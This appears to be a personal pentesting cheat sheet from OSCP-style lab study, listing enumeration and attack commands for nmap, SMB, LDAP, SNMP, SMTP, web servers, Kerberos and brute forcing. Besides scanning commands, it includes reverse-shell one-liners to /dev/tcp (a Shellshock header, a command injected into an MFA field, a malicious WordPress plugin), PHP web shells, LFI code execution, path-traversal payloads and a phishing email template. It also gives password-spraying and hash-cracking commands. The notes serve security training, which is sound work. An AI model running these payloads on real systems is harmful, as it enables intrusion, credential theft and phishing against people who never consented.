---
title: "1 - Enumeration"
nav_order: 1
layout: default
has_children: true
---

# Enumeration

## nmap

Starting commands:
1. `sudo nmap -p- -v -T4 -sC -A $IP --open` to reveal `$port1`, `$port2`, and so on
2. Then: `sudo nmap -sC -A -p$port1,$port2,etc $IP -T4`

- `sudo nmap -v -p- -sC -sV -T4 192.168.100.101` (Checks all ports)(T4/5 for additional speed)(-Pn to assume host is up)
- `sudo nmap -v -p- -sC -sV 192.168.100.101 -T4 -oN openports.txt && grep '/tcp' openports.txt | cut -d '/' -f 1 | paste -sd ','` (faster and echos open ports)
- `sudo nmap -sU 192.168.100.101` (Checks UDP ports specifically)

nmap flags:
-sS (SYN Scan)
-sU (UDP Scan)
-sT (TCP Scan)
-sV (Version enum)
-O (OS Fingerprinting)
-Pn (Assume host is up)
-p (Ports)
-A (runs all scans)
-n (No DNS)
-T 0-5 (Timing of scans, 0 is fastest, 3 is default)

#### Print Open Ports (test)
- Print open ports: `nmap $Ip |  grep '/tcp' | cut -d '/' -f 1 | paste -sd ','`
- include the standard output in a file (scan.txt) and also the ports in a second line
`nmap $Ip -oN scan.txt && grep '/tcp' scan.txt | cut -d '/' -f 1 | paste -sd ','`
- no file creating
`output=$(nmap 192.168.247.122); echo "$output"; echo -n "Ports: "; echo "$output" | grep '/tcp' | cut -d '/' -f 1 | paste -sd ','`

#### Scripting Engine
- Nmap Scripting Engine
	- The nmap scripting engine can also be used for more thorough scanning
	- Ex: `nmap --script=$script1.nse, $script2.nse $IP`
	- Find scripts: `ls /usr/share/nmap/scripts| grep $searchTerm`
	- Help on script: `nmap --script-help=$script.nse`
	- Run wildcard script: `sudo nmap --script=smb* -p 445 -Pn $IP`
	- Useful scripts from QuirkyKirkHax:
		- smb-os-discovery
		- snmp-brute * (hydra might be better)
		- smtp-brute
		- smtp-commands
		- smtp-enum-users

#### nmapautomator
- Info: [nmapAutomator](https://github.com/21y4d/nmapAutomator)
- `./nmapAutomator.sh --host $Ip --type All (or Network/Port/Script/Full/UDP/Vulns/Recon)`

#### autorecon
- Info: https://github.com/Tib3rius/AutoRecon

---

## NFS

Network File System allows you mount and access files on a remote system as if they were on your local machine. RPC binds to 111 and you can use that port to enumerate other services using rpc (rpc-info script)

You can then use the nmap scripts to gather as much info on the nfs side as possible.
`nmap -p 111 --script nfs* $IP`

Then you can mount the shared drive to your own machine and dig into it.
`sudo mount -o nolock $IP:/$shareDirectory $localMount`

If you cannot access the file: 
1. you may need to check what UUID is allowed to view the file:
- `ls -l`
2. And then create a new user on your local machine:
- `adduser`
3. Change the UUID of the newly created user:
- `sudo sed -i -e 's/[CURRENTUUID]/[NEWUUID]/g' /etc/passwd`
4. Check and make sure the command ran properly:
- `cat /etc/passwd|grep $user`
5. `su` to the new user and read away.

Useful nmap scripts:
rpc-info.se
nfs-ls.se
nfs-showmount.se
nfs-statfs.se

---

## RPC

Enumerate users: `rpcclient -N -U "" $IP -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";`
- No pass and no user

Change users password: `setuserinfo $username 23 '$password'`
- "23" refers to level of user information being modifying, and 23 is for passwords.  It doesn't change, unless you're trying to modify something else. 

`rpcinfo $IP`

Passwordspray:
`for u in $(cat valid_users.txt);do rpcclient -U "$u%$password" -c "getusername;quit" 172.16.5.5 | grep Authority; done`

---

## SMB

**tip - use command `recurse` before `ls` or `dir`**

- `nxc smb 192.168.101.100 -u '' -p '' --shares`
- `nxc smb 192.168.101.100 -u '' -p '' --users`
- `nxc ldap 10.10.10.10 -u '' -p '' -M get-desc-users`
- `nxc ldap 10.10.10.10 -u '' -p '' --password-not-required --admin-count --users --groups`
- `nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 $IP -Pn` (SambaCry and EternalBlue)

To probe NetBIOS info:
`nbtscan -v ​$IP`
-The hex codes reference different services.  You can look up what they mean, but 20 means File Sharing services.
- http://www.pyeung.com/pages/microsoft/winnt/netbioscodes.html

### smbclient
To list what resources are being shared on a system:
- `smbclient -L $IP -N`
	- with no creds
- `smbclient -L $IP -U $user`
- `smbclient //$IP/$shareName -U $user%$password`
- `smbclient //$IP/$shareName -U $user --pw-nt-hash $NTLMHash`
- `smbclient //$IP/$shareName --directory path/to/directory --command "get file.txt"`
	- to download file
- `smbclient //$IP/$shareName --directory path/to/directory --command "put file.txt"`
	- to upload file

#### Format
Linux: `smbclient //server/share`
Windows: `smbclient //server/share` or `smbclient \\\\server\\share`

To display share information on a system:
- `nmblookup -A ​$IP`

Enum4linux is a great tool to gather information through SMB (note, it tests anonymous login only by default):
- `enum4linux -a ​$IP`
- try also ?: `enum4linux-ng -a ​$IP`

Brute force using hydra:
`hydra -l $User -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt smb://$IP/ -V -I`   

### smbmap
`smbmap -u $user -p $password -d INLANEFREIGHT.LOCAL -H $IP -R '$directory' --dir-only`
	- use without `--dir-only` to show all files

### to get all files from an smb share
1. `smbclient \\\\$IP\\SYSVOL -U "domain.offsec\$username"`
2. `recurse on`
3. `prompt off`
4. `mget *`
5. `exit`
6. `find . -type f`
	1. This lists all the files you have downloaded into the directory you downloaded them into

### Command Execution with NXC:
- `nxc smb 10.10.10.10 -u Username -p Password -X 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY...AKAApAA=='`
```
netexec smb 10.10.10.10 -u Username -p Password -X 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY...AKAApAA=='
SMB         10.10.10.10   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:EXAMPLE.com) (signing:True) (SMBv1:False)
SMB         10.10.10.10   445    DC               [+] EXAMPLE.com\Username:Password (Pwn3d!)
SMB         10.10.10.10   445    DC               [-] WMIEXEC: Could not retrieve output file, it may have been detected by AV. If it is still failing, try the 'wmi' protocol or another exec method
```

### Password Spraying
`nxc smb $IP -u users.txt -p 'password' -d domain.com --continue-on-success`

---

## MSSQL

### Commands
- enum_db
- 
- `SELECT @@version;`
- `SELECT name FROM sys.databases;` (to list all available db's)
	- master, tempdb, model, and msdb are default
- `SELECT * FROM $non-default-db.information_schema.tables;`
	- `select * from $non-default-db.dbo.$table;`

See if we can impersonate a user:
- `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`
If we can impersonate `$user-reader`:
- `EXECUTE AS LOGIN = '$user-reader'`
- `use $user`

### xp_cmdshell
1. `EXECUTE sp_configure 'show advanced options', 1;`
2. `RECONFIGURE;`
3. `EXECUTE sp_configure 'xp_cmdshell', 1;`
4. `RECONFIGURE;`
5. `EXECUTE xp_cmdshell 'whoami';`

### xp_dirtree
- `xp_dirtree C:\inetpub\wwwroot` for example 

### Brute forcing with ffuf
https://medium.com/@opabravo/manually-exploit-blind-sql-injection-with-ffuf-92881a199345

### Tools
- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

---

## SNMP

### Notes
SNMP is that it operates using community strings which means it sends passwords when it sends data. Can be sniffed with wireshark. 
Versions:
- SNMPv1 is all cleartext, so it is easy to grab the string
- SNMPv2 has some inherent weaknesses allowing it to be grabbed 2
- SNMPv3 is encrypted, but it can be brute forced.

There are 2 kinds of community strings: Public (Read Access) and Private (Write Access).

You can also brute-force the string with nmap or Hydra:
`nmap --script=snmp-brute $targetIP
`hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt snmp://$targetIP/

But you need community string first:

### onesixtyone
- `onesixtyone -c $(file containing community strings (public, private, manager)) -i $(file containing target ips)`
- Note that there are seclists with common community strings
	- SecLists/Miscellaneous/wordlist-common-snmp-community-strings.txt
	- /usr/share/seclists/Discovery/SNMP/snmp.txt

### snmpwalk
- `snmpwalk -c public -v1 -t 10 $targetIP`: where public is the community string (could be private or mamanger)
- `snmpwalk -c public -v1 192.168.50.151 $OIDString` - for specific info
- `snmpwalk -v $version -c public $IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull`
- `snmpwalk -v 2c -c public 192.168.243.156 NET-SNMP-EXTEND-MIB::nsExtendObjects`
	- **This one seems to return the most, and everything else seemed to miss some information from OSCP Exam C**

```
|OID| Target |
|--|--|
| 1.3.6.1.2.1.25.1.6.0 | System Processes |
| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path |
| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units |
| 1.3.6.1.2.1.25.6.3.1.2  | Software Name |
| 1.3.6.1.4.1.77.1.2.25 | User Accounts |
| 1.3.6.1.2.1.6.13.1.3 | TCP Local Ports |
```
- `snmpwalk -Os -c public -v 1 $IP system`
	- to retrieve all
	- try 'v 2c' as well 

### Useful Nmap Scripts:
snmp-brute
snmp-win32-services.nse
snmp-win32-shares.nse
snmp-win32-software.nse
snmp-win32-users.nse

### snmpset
You can even overwrite and set some OIDs if things are misconfigured:
`snmpset -c $communityString -v $version $OID $VALUE`

### snmpenum
`snmpenum $targetIP ​$communityString $configFile
- config files are in /usr/share/snmpenum/

---

## FTP

With no creds:
- `ftp anonymous@192.168.100.101`

To an alternate port:
- `ftp $user@$IP $port`


### Hydra
With a username:
 `hydra -L usernames.txt -P passwords.txt 192.168.100.101 ftp`

- `hydra -l $user -P passwords.txt 192.168.100.101 ftp`

With a password:
- `hydra -L usernames.txt -p $password 192.168.100.101 ftp`

---

## SSH

`ssh -i $key $user@$target`

alternate port `ssh -p $port $user@$target`

You can connect to the ssh service via netcat to grab the banner and search the version for OS info.
- `nc -nv $IP 22`

### Brute forcing:
With no creds:
- `hydra -L usernames.txt -P passwords.txt 192.168.100.101 ssh`

With a username:
- `hydra -l $user -P passwords.txt 192.168.100.101 ssh`

With a passwords:
- ` hydra -L usernames.txt -p $password 192.168.100.101 ssh`

Useful nmap scripts:
- ssl-heartbleed.nse

SSH permissions too open?
`chmod + 600 $key.id_rsa`

### creating ssh key
- ssh-keygen
- `ssh -p 2222(unless 22) -i $created_key(no pub) $user@$host`
- Using a id_sa (private key) from /home/user/.ssh/id_sa

### Password Protected SSH key
1. may need to chmod 600 id_rsa (too many permissions won't work)
2. ssh2john id_rsa > ssh.hash
3. remove "id_rsa:" from ssh.hash
4. hashcat -h | grep -i "ssh" (22921 for example)
5. hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force

---

## SMTP

Commands:
- VRFY command tells if an email address exists.
- EXPN command shows membership of mailing list
- RCPT (you'll need a valid email for this for an exploit)

### smtp-user-enum
- To verify usernames: `smtp-user-enum -M VRFY -U users.txt -t $host` 
	- host is IP or hostname
- `smtp-user-enum -M EXPN -u $username -t $host`
- `smtp-user-enum -M RCPT -U users.txt -T $hostlist`
- `smtp-user-enum -M EXPN -D $domain -U users.txt -t $host`

### Swaks
Swaks (Sending email from command line when you have creds for mail server)
- `swaks --to <recipient@email.com> --from <sender@email.com> -ap --attach @<attachment> --server <mail server ip> --body "message" --header "Subject: Subject" --suppress-data`
	- You will need the password of the mail server user (likely the sender)
	- Note that the mail server may not be the same machine as the user who opens the email

### Send email over NC

1. `nc -v $host 25`
2. `helo pop`
3. `MAIL FROM: user@domain` (this may not need to be a real user)
4. `RCPT TO: targetUser@domaain` (does need to be real)
5. `DATA`
6. 
```
Subject: RE: password reset

Hi user, 

Click this link or your skip manager gets it - http://$kaliIP/

Regards, 

.   
```
7. `QUIT`
8. `Bye`

---

## MySQL

- From kali: `mysql --host $IP -u root -p$password`
	- note that there is no space between -p flag and $password
	- If you get "TLS/SSL error: SSL is required", you can append `--skip-ssl`
- Or from target: `mysql -u $user -p $database` (p flag is db password, have to enter that after)

### Commands
- `select system_user();`
- `select version();`
- `show databases;`
-` SELECT * FROM $tableName WHERE $column='$field;'`


### Brute forcing with ffuf
https://medium.com/@opabravo/manually-exploit-blind-sql-injection-with-ffuf-92881a199345

---

## LDAP

- if you have ldap and can't find anything else:
`sudo nmap -sC -A -Pn --script "*ldap*" $IP -oN outputfile.txt'` (use output.ldap)

##### ldapdomaindump
`ldapdomaindump -u $domain.com\\ldap -p '$ldapPassword' $domain.com -o $outputDirectory`

- when you find the dc from the above script which says: "Context: DC=$name,DC=offsec":
`ldapsearch -x -H ldap://$IP -b "dc=$name,dc=offsec" > $name.ldapsearch`  (grep for cn/description/sAMAccountName)
	- This is for when the domain is `$name.offsec`
- `ldapsearch -x -H ldap://172.16.227.10 -D '$domain.com\$user' -w '$password' -b "DC=$domain,DC=com"`
- `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength`
- Another example: `ldapsearch -x -b "dc=support,dc=htb" -H ldap://support.htb -D ldap@support.htb -W "*" `
1. -x: This option specifies to use simple authentication instead of SASL (Simple Authentication and Security Layer). It's often used for basic access without requiring additional security mechanisms.
2. -b "dc=support,dc=htb": This sets the base distinguished name (DN) for the search. In this case, it specifies that the search should start from the "dc=support,dc=htb" node in the directory. "dc" stands for domain component.
3. -H ldap://support.htb: This option specifies the LDAP server's URI. In this case, it's pointing to an LDAP server at support.htb.
4. -D ldap@support.htb: This is the bind DN (distinguished name) for authenticating to the LDAP server. Here, it's using the email-style format ldap@support.htb as the identity to authenticate with.
5. -W: This prompts for the password of the user specified with the -D option. It ensures that the password is not visible in the command line.
6. `"*"`: This indicates the search filter. Using `"*"` means that it will return all entries in the specified base DN.

`ldapsearch -x -b "dc=support,dc=htb" -H ldap://support.htb -D ldap@support.htb -W "(objectClass=user)"`

Windapsearch
- `python3 windapsearch.py --dc-ip $dcIP -u $user@domain.com -p $pass --da`
	- where `--da` means to enumerate domain admins
	- or `-PU` enumerates privileged users


First: `ldapsearch -H ldap://monitored.htb -x -s base namingcontexts`
Then: `ldapsearch -H ldap://monitored.htb -x -b "dc=monitored,dc=htb"`

---

## DNS

DNS Enumeration might give you information on other hosts in the network.
Keep in mind, you will probably have to mess with /etc/conf for this!!!

If you are looking for DNS servers specifically, use nmap to quickly and easily search:
`nmap -sU -p53 ​$network`

Normal DNS Query:
`nslookup ​$IP`

Query for MX Servers within a domain:
`dig ​$domain ​MX`

Query for Name Servers within a domain:
`dig ​$domain ​NS`

DNS Zone Transfer (This will give you all of the marbles!)
`dig axfr @​$nameServer $domain`
`dnsrecon -d ​domain ​-a --name_server ​server`

If you want to brute force subdomain enum, try dnsmap:
`dnsmap ​$domain`

---

## Web Servers

### Directory Scanning
#### Gobuster
- `gobuster dir -u $URL -w /usr/share/wordlists/$wordlist.txt -t 5 -x .php, .txt -o gobuster.txt`
	- Where `-o` the resulting output is called results.txt
	- Where `-x` checks for those extensions
- EX: `gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 5`
- EX: `gobuster dir -u http://$IP/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -k`
- Dirb is recursive - EX: `dirb http://$IP -z 10`
- **To ignore ssl/tls errors, use the `-k` flag**

#### feroxbuster 
-`feroxbuster -u $URL`
- `feroxbuster -u $URL -w $wordlist`
- `feroxbuster -u $URL -t $numberOfThreads`
- `feroxbuster -u $URL --timeout $timeoutInSeconds`
- `feroxbuster -u $URL --filter-status 404,403,400 --thorough -r`
- `feroxbuster -u $URL:$alternatePort
- `feroxbuster -u $URL -w $wordlist`

#### Nikto
- `nikto -h http://foo.com -port 8000`

#### Subdomains
**need to edit /etc/hosts with the subdomain**
With gobuster `gobuster dns -d $domain.local -t 25 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

With wfuzz: `wfuzz -c -f sub-domains -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u 'domain.com' -H "Host: FUZZ.domain.com" --hw 93` where:
- The `-c` flag prints output with colors
- The `-f` flag outputs to a file (`sub-domains`)
- The `-w` flag is to name the wordlist
- The `-u` flag is to name the url
- THe `-H` flag is to pass the header
- The `--hw` flag is to hide results with a word count of 93. You'll need to run without this flag and then see what you are getting too much of. 

With ffuf: `ffuf -u http://$IP -H 'Host: FUZZ.domain.com' -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac`

dirsearch: `dirsearch -u http://dev.devvortex.htb/"`


### General Notes
- Check for robots.txt and sitemap.xml!
- Check for admin consoles for respective apps (MySQL, Tomcat, phpmyadmin, etc)
- Check source
	- Usernames, passwords, IPs of other machines?
	- Any fields to input data for SQLi or XSS 
	- If you find cgi-bin and are forbidden to access it, you can still brute force the cgi names to test for shellshock vuln
		- `gobuster dir -u http://$IP/ -e -s "200,204,403,500" -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt`
		- `curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://[IP]/cgi-bin/user.sh`
		- `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/[IP]/53 0>&1' http://$IP/cgi-bin/user.sh`
- Take note of framework and OS the webserver is using.  Might help you know what tools are installed on the system.
- Useful nmap scripts:
	- `http-shellshock --script-args uri=[PATHTOCGI]`
- php://filter and php://data wrappers are gonna be big!

### Directory Traversal
On Linux, we can use the `/etc/passwd` file to test directory traversal vulnerabilities. On Windows, we can use the file `C:\Windows\System32\drivers\etc\hosts` to test directory traversal vulnerabilities, which is readable by all local users. In Linux systems, a standard vector for directory traversal is to list the users of the system by displaying the contents of /etc/passwd. Check for private keys in their home directory, and use them to access the system via SSH.
- May need to access these files, `/etc/passwd` through Burp
- Try absolute path, like `/etc/passwd` as well as with traversal sequences like `../../`
- Consider that the `../` maybe be stripped: 
  `/image?filename=....//....//....//etc/passwd` (for if application strips path traversal sequences from the user-supplied filename before using it)
- Encoding:
	  - Without:`../../../etc/passwd`
	  - URL Encoded: `%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd`
	  - Double URL encoded: `%252e%252e%252f%252e%252e%252f%252e%252e/etc/passwd`
- If the start of the path is validated for user supplied input: 
	- `image?filename=/var/www/images/../../../../etc/passwd`
- If the application requires the filename to end with an expected file extension:
	- `/image?filename=../../../etc/passwd%00.jpg`
	- **The `%00` is a null byte which effectively terminates the file path before the extension. **

### Encoding Notes (not sure)
Examples:	`%20 = " "` and `%5C = "\"` and `%2e = "."` and `%2f = "/"`
- Note: Don't encode the "-" character in flags, and it looks like "/" characters also don't need to be encoded. 
- [URL Encoder](https://www.urlencoder.org/)
- EX: `curl http://$URL$.com/directory/uploads/backdoor.pHP?cmd=type%20..%5C..%5C..%5C..%5Cxampp%5Cpasswords.txt
	- where backdoor is the cmd script in the RFI section below that has already been uploaded to the Windows machine so that we can read the passwords.txt file.
	- When there is a username field, password field, and additional called MFA - From: "&&bash -c "bash -i >& /dev/tcp/192.168.45.179/7171 0>&1""
	- Becomes: `username=user1&password=pass1&ffa=testmfa"%26%26bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.179%2F7171%200%3E%261%22"`
	- So make sure to enclose command in `"&&$encondedCommand"` (incl. quotes).

#### LOG POISONING
`<?php echo system($_GET['cmd']); ?>`
Then submit `&cmd=$command` in request i.e. `&cmd=whoami`

#### Shells
- https://github.com/WhiteWinterWolf/wwwolf-php-webshell
- `bash -c "bash -i >& /dev/tcp/$IP/4444 0>&1"`
	- can URL encode
- [revshells.com](revshells.com)


### Specific Web Servers
#### Apache
This might need to be in the /etc/apache2/apache2.conf file for php to execute:

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
    AddType application/x-httpd-php .php
```

#### IIS 
payload = .asp/.aspx shell

`C:\inetpub\wwwroot`
`iisstart.htm` = default welcome page


.htaccess for IIS servers: Similarly, developers can make directory-specific configuration on IIS servers using a web.config file. This might include directives such as the following, which in this case allows JSON files to be served to users:
```
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
    </staticContent>
```


### Wordpress
Initial enumeration: `wpscan --url http://$url --api-token $APIToken`
`/wp-admin` is the admin login page.
#### reverse shell Wordpress plugin
If you get into the admin page, you can upload malicious plugins. Plugins are defined as a zip file with 2 php files inside. (This may not be true provided the below syntax info is included in the php exploit file - so one file total with this or two files - one with this and one with the exploit). Syntax below:
```
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Author Name
* Author URI: http://www.website.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/$kaliIP $port 0>&1'");
?>
```

- The plugin files will be accessible from the following link:
`http://$target/wp-content/plugins/$zipName/$phpFileNmae`

### Upload Execution Tip
1. `echo "AddType application/x-httpd-php .xxx" > .htaccess`
2. upload the .htaccess file
3. then upload the .xxx file which can be executed as php

### PHP Wrappers
Note that in order to exploit these vulnerabilities, the allow_url_include setting needs to be enabled for PHP, which is not the case for default installations. That said, it is included in the material, so it makes sense to be aware of it. 
Ex: exploiting a page called admin.php
-  `curl http://$IP/$directory/index.php?page=admin.php`
-  Note that if the `<body>` tag is not closed (with a `</body>` tag at the end), the page could be vulnerable. Let's try to exploit it with the **php://filter** tag. 
	1. `curl http://$IP/$directory/index.php?page=php://filter/**convert.base64-encode**/resource=admin.php`
		1. This should return the whole page which can then be decoded for further information. 
	2. `echo "$base64Text" | base64 -d`
- Now let's try with the **data://** wrapper. 
	1. `curl "http://$IP/$directory/index.php?page=**data://text/plain**,<?php%20echo%20system('ls');?>"`
		1. This shows that we can execute embeeded data via LFI. 
	2. But because some of our data like "system" may be filtered, we can encode it with base64 and try again. 
	3. `echo -n '<?php echo system($_GET["cmd"]);?>' | base64`
		- PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
	4. `"http://\<host>/\<directory>/index.php?page=**data://text/plain;base64**,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`

---

## Kerberos

**1. ADD THE DNS NAME TO YOUR `/etc/hosts` FILE**
- `dc.domain.com` AND domain.com`

To enumerate accounts ON DC:
`kerbrute userenum --dc $ip -d CONTROLLER.local Users.txt`
- --dc can point to a domain 
- probably `kerbrute_linux_arm userenum -d $domain.com --dc $IP users.txt`

To check for users on 445 with RPC:
`rpcclient -U "" -N $IP`
	- `enumdomusers`
	- `querygroup 0x200`  
	- `querygroupmem 0x200`
	- `queryuser 0x1f4` 


### Other AD Enum
`enum4linux -u "" -p "" -a <DC IP> && enum4linux -u "guest" -p ""-a <DC IP>`

`smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
`smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
`nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`

### Suggestions
- ASRepRoast if username but no password

---

## Brute Forcing

### Check for default credentials
- Google default credentials for the application (duh)
- `grep -r $searchTerm /usr/share/seclists`

### Hydra
- `hydra -l $username -P /usr/share/wordlists/rockyou.txt -s $alternatePort ssh://$IP`
- `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "$password" rdp://$IP
- Web page example 1:`hydra -l $user -P /usr/share/wordlists/rockyou.txt $IP http-post-form " /login.php:fm_usr=^USER^&fm_pwd=\^PASS^:Login failed. Invalid"`
	- Note that it may just be `/login` not `/login.php`
- Web page example 2: `hydra -l '$username' -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt $IP http-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect"`
	- -`"$loginpage:$parameters:$failMessage$"`
- Basic Auth: `hydra -l admin -P /usr/share/wordlists/rockyou.txt $URL http-get`
- `hydra -L $userlist -p $pass -s 8081 $IP http-post-form '/$path:username=^USER64^&password=^PASS64^:Incorrect'`
	- where -s is for alternate ports, like 8081 and the USER and PASS are base64 encoded
- `hydra -l $user -P $passlist 'http-post-form://192.168.198.61:8081/$path$:username=^USER64^&password=^PASS64^:C=/:F=403'` 
	- Where failure is indicate by 403 error
- Notes:
	- To get Hydra to base64 each item in a list, add a 64 after the USER and PASS variables. (^USER64^ and ^PASS64^)

### Hashcat
- `hashcat -m 0 $hashfile /usr/share/wordlists/rockyou.txt -r 15222.rule --force --show`
- `hashcat -m 13400 $keepassHashFile /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show`
- check hashcat for which mode to use (searching for KeePass in this case)
	- `hashcat --help | grep -i "KeePass"`
	- `hashcat -h | grep -i "ssh"`

### john the ripper
- `ssh2john id_rsa > ssh.hash` 
- `keepass2john name.kdbx > keepass1.hash`
- `john --format=krb5tgs sql_svc.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt`

### Misc
- If you're using Burp Intruder for anything, make sure to go to options to set custom error message and follow redirects
- There is http-get-form and https-post-form
- Can create a wordlist from a web page using `cewl`
	- `cewl -d -m 3 $URL -w $output.txt`
		- d = depth, m = minimum letters
	- `cewl $URL > pass`
	- `cewl --lowercase $URL`
- Generate a username list from names: https://github.com/jseidl/usernamer

---

## I'm Stuck

Remember: Enumerate deeply, exploit simply.

Did you do all of these?
- `sudo nmap -v -p- -sC -sV 192.168.100.101`
- `sudo nmap -sU 192.168.100.101`
- `nxc smb 192.168.101.100 -u '' -p '' --shares`
- `nxc smb 192.168.101.100 -u '' -p '' --users`
- `nxc ldap 192.168.101.100 -u '' -p '' -M get-desc-users`
- `nxc ldap 192.168.101.100 -u '' -p '' --password-not-required --admin-count --users --groups`
- `enum4linux -a $IP`

### Web Server
Did you fuzz for extensions "--extensions php,rb,txt" in feroxbuster?
Did you check for subdomains too, not just subdirectories?
Did you add your domain name to the `/etc/hosts` file?
If you see a real blog on a lab (as opposed to Lorem Ipsum), read it

### Other Tips
Use `nc` to connect directly with a port to see if you can get any output.  This can grab banners. 

Upload a file to SMB/FTP server to try and execute from the web server

Did you try to use different ports? Specifically the ports the target has open for reverse shells?

Did you try to use `domain.com/user` or just `user`?
Same with `local-auth`

Try `crackstation` or `NTLM.pw`

### Strategy
When facing a Windows server with so many ports, I'll typically start working them prioritized by my comfort level. I'll generate a tiered list, with some rough ideas of what I might look for on each:

- Must Look AT
    - SMB - Look for any open shares and see what I might find there.
    - LDAP - Can I get any information without credentials?
- If those fail
    - Kerberos - Can I brute force usernames? If I find any, are they AS-REP-Roast-able?
    - DNS - Can I do a zone transfer? Brute force any subdomains?
    - RPC - Is anonymous access possible?
- Note for creds
    - WinRM - If I can find creds for a user in the Remote Management Users group, I can get a shell

---

## OSINT

1. DNS
	1. netcraft.com
	2. whois
2. Google dorking (filetype:pdf) etc.
3. StackOverflow
4. Shodan (for public facing)
5. Github
6. TheHarvester - automate OSINT on user emails
7. Social Searcher - deep dives on social media
8. https://osintframework.com/
9. Recon-ng

---
